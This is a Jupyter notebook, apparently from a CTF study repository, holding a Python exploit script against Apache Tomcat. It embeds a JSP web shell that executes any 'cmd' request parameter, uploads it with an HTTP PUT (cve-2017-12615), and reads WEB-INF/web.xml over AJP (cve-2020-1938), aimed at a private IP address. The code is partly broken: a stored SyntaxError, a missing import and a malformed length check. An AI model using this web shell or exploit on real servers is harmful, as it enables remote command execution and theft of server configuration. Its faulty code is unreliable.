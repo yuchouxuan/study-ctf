{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "####  cve-2017-12615"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "ename": "SyntaxError",
     "evalue": "invalid syntax (1628215496.py, line 2)",
     "output_type": "error",
     "traceback": [
      "\u001b[1;36m  Input \u001b[1;32mIn [60]\u001b[1;36m\u001b[0m\n\u001b[1;33m    import  ../utfc.tomcat_2020_1938 as exp_201938\u001b[0m\n\u001b[1;37m            ^\u001b[0m\n\u001b[1;31mSyntaxError\u001b[0m\u001b[1;31m:\u001b[0m invalid syntax\n"
     ]
    }
   ],
   "source": [
    "import re\n",
    "import  utfc.tomcat_2020_1938 as exp_201938\n",
    "class tom: \n",
    "    url =\"\"\n",
    "    shell = br'''\n",
    "<%@ page import=\"java.util.*,java.io.*,java.net.*\"%>\n",
    "<%\n",
    "out.println(\"afox\");\n",
    "out.println(\"<br>- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - <br>\");\n",
    "if (request.getParameter(\"cmd\") != null) {\n",
    "    Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));\n",
    "    OutputStream os = p.getOutputStream();\n",
    "    InputStream in = p.getInputStream();\n",
    "    DataInputStream dis = new DataInputStream(in);\n",
    "    String disr = dis.readLine();\n",
    "    while ( disr != null ) { out.println(disr); disr = dis.readLine(); }\n",
    "}\n",
    "\n",
    "%>\n",
    "    '''\n",
    "    def __init__(self,url):\n",
    "        self.url = url\n",
    "        self.exp2()\n",
    "\n",
    "    def ex1(self):\n",
    "        #cve-2017-12615\n",
    "        try:\n",
    "            requests.put(url+'fox01.jsp/',data=self.shell)\n",
    "            if 'afox' in requests.get(url+'fox01.jsp').text:\n",
    "                print('[+]cve-2017-12615|',url+'fox01.jsp?cmd=whoami')\n",
    "        except:\n",
    "            print('[ ]cve-2017-12615 ')\n",
    "    def exp2(self,fn='WEB-INF/web.xml',portj=8009,):\n",
    "        ip = self.url.split('/')\n",
    "        head = ip[0]+'//'\n",
    "        if len(ip[-1]) <6:\n",
    "            ip = ip[-2]\n",
    "        else :\n",
    "            ip = ip[-1] \n",
    "        ipx = ip.split(':')\n",
    "        if len(ipx) >1:\n",
    "            port = ipx[-1]\n",
    "        else:\n",
    "            port ='80'\n",
    "        ip = ':'.join(ipx[:-1])\n",
    "\n",
    "        t= exp_201938.Tomcat(ip, portj)\n",
    "        _,data = t.perform_request('/asdf',attributes=[\n",
    "    {'name':'req_attribute','value':['javax.servlet.include.request_uri','/']},\n",
    "    {'name':'req_attribute','value':['javax.servlet.include.path_info',fn]},\n",
    "    {'name':'req_attribute','value':['javax.servlet.include.servlet_path','/']},\n",
    "    ])\n",
    "    if(len(data> 10)):\n",
    "        print('[+]cve-2020-1938')\n",
    "        print(data)\n",
    "    \n",
    "       \n",
    "    \n",
    "tom(\"http://10.101.0.8:8080/\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "3bd13bc16400e16874b7ce28af58a129343287e94248a182c1f06fbb6b76ef8e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
